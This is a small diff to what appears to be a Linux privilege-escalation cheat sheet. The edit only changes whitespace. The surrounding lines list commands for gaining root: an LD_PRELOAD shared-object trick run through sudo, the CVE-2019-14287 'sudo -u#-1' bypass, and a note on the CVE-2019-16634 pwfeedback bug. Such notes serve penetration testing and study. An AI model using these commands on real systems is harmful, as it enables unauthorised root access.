@@ -65,7 +65,8 @@ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
 sudo LD_PRELOAD=/tmp/preload.so [sudo binary] 
 
 ## CVE-2019-14287 
-sudo -l, see (ALL,!root) 
+sudo -l, see (ALL,!root)  
+
     sudo -u#-1 [binary escape]  
 ## CVE-2019-16634 
 sudo su root, type password, see ******: passwd feedback enabled 
